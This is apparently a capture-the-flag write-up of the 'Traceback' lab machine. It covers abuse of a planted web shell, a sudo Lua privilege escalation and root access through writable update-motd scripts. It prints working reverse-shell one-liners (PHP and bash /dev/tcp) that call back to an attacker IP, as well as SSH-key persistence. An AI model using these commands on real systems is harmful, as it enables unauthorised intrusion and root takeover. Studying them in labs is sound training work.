# Traceback

## Enumeration

We start off with a full-port nmap to check running services (most of output truncated)

```bash
$ sudo nmap -sS -n -p- -A -oN full.nmp 10.10.10.181

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
```

We see port 22 with SSH and port 80 with HTTP. Let's check the HTTP.

### HTTP

We're greeted with a strange message:

![The Message](<../../.gitbook/assets/image (45).png>)

It seems as if our job is to find the "backdoor" into the system. The source has nothing particularly interesting, except for a comment:

![The Comment](<../../.gitbook/assets/image (37).png>)

If we google this comment we come across an interesting [GitHub repo](https://github.com/TheBinitGhimire/Web-Shells) with a collection of reverse shells. Let's put their names in a file called `wordlist.txt` and run `gobuster`:

```
alfa3.php
alfav3.0.1.php
andela.php
bloodsecv4.php
by.php
c99ud.php
cmd.php
configkillerionkros.php
jspshell.jsp
mini.php
obfuscated-punknopass.php
punk-nopass.php
punkholic.php
r57.php
smevk.php
wso2.8.5.php
```

```
$ gobuster dir -u http://10.10.10.181/ -w wordlist.txt -t 50

===============================================================
/smevk.php (Status: 200)
===============================================================
```

It appears as if `smevk.php` is on the target! Let's head over to http://10.10.10.181/smevk.php and we what happens.

![The Webshell](<../../.gitbook/assets/image (4).png>)

It definitely exists! The [repo ](https://github.com/TheBinitGhimire/Web-Shells/blob/master/smevk.php)tells us the default credentials are `admin:admin`.

![Yes, it's pretty hideous](<../../.gitbook/assets/image (7).png>)

## Foothold

The webshell looks horrible, but we have an `Execute` input where we can run commands. We can now use this to get an actual reverse shell.

First we use `nc` on a terminal to listen for incoming connections:

```
$ nc -nvlp 9001
```

Next we use a [PHP reverse shel](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)l **on the webshell** to redirect execution to it:

```
$ php -r '$sock=fsockopen("10.10.14.21",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
```

We get a connection! This is a fairly bad shell, but we can easily [upgrade it to be useful](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/).

## User

### Enumeration

Now we have a foothold, let's check what's in our user's home directory. It appears to be a file called `note.txt`:

```
webadmin@traceback:/home/webadmin$ ls
note.txt

webadmin@traceback:/home/webadmin$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

We have been left "a tool to practise Lua". As always, first thing we should do as a new user is **check our permissions.**

```
webadmin@traceback:/home/webadmin$ sudo -l
User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

We can run `luvit` as `sysadmin`! We can guess that `luvit` is the tool that runs Lua scripts. Because we can run it as `sysadmin`, if we create a Lua script that spawns a shell we will spawn with higher privileges.

### Exploitation

```lua
os.execute("/bin/bash")
```

This is the command we want to run. We can simply use `echo` to create it:

```
webadmin@traceback:/home/webadmin$ echo 'os.execute("/bin/bash")' > privesc.lua
```

Now let's run it as `sysadmin`!

```
$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
$ whoami
sysadmin
```

{% hint style="info" %}
You could also have done it in one line using the `-e` flag:

`sudo -u sysadmin /home/sysadmin/luvit -e ‘os.execute(“/bin/bash”)’`
{% endhint %}

We can now read `user.txt`!

```
sysadmin@traceback:/home/webadmin$ cat ~/user.txt
895...
```

## Root

Firstly, we want to get a nice SSH shell. We can get this using SSH keys.

### Getting SSH Access

First create the key pair:

```
$ ssh-keygen -f traceback

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again:
[...]
```

I just hit `Enter`, meaning there's no passphrase. Now `cat traceback.pub` and echo it into `~/.ssh/authorized_keys` - this registers the keypair as valid.

{% hint style="warning" %}
When using `echo` in these scenarios, use `>>` rather than `>`. Using only a single `>` will overwrite all the other contents, essentially erasing any keys owned by other people, which is not a great thing to do.
{% endhint %}

{% hint style="info" %}
If `~/.ssh` doesn't exist already, make sure you create it.
{% endhint %}

```
echo "<public key>" >> ~/.ssh/authorized_keys
```

{% hint style="danger" %}
Make sure you spell it `authorized` not `authorised`!
{% endhint %}

Now we can log in via SSH using

```
ssh -i traceback sysadmin@10.10.10.181
```

### Finding the Vulnerability

To perform some automated privesc recon, I'm going to run [`linpeas`](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).  Port it over by hosting it on a python SimpleHTPServer:

```
$ sudo python3 -m http.server 80
```

The `wget` it on the box:

```
wget 10.10.14.21/linpeas.sh
```

Then `chmod`, run and analyse the output.

Something that **really** sticks out is this:

![GROUP Writeable Files](<../../.gitbook/assets/image (44).png>)

These scripts get run **every time someone logs in with SSH**. If we can modify them (which we can), they will run whatever we modify them to. The important part here is [**they get run as root**](http://manpages.ubuntu.com/manpages/xenial/man5/update-motd.5.html).

### Exploitation

So the privesc is simple, but what should we get the file to do? There are a couple types of choices:

* Run something that enables us to get root
* Print the flag

In these situations, if both approaches are equivalently easy, then it's a good idea to go for **the approach that affects the least other users**. Nobody can notice our reverse shell since it's directly to our IP, so it doesn't affect other users.

```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.21/9002 0>&1' > 00-header
```

Make sure you set up an `nc` listener on port 9002 and then log in via SSH again.

```
$ nc -nvlp 9002
```

```
$ ssh -i traceback sysadmin@10.10.10.181
```

And bam, we have a root shell.

```
root@traceback:/# whoami
whoami
root

root@traceback:/# cat /root/root.txt
cat /root/root.txt
e68...
```

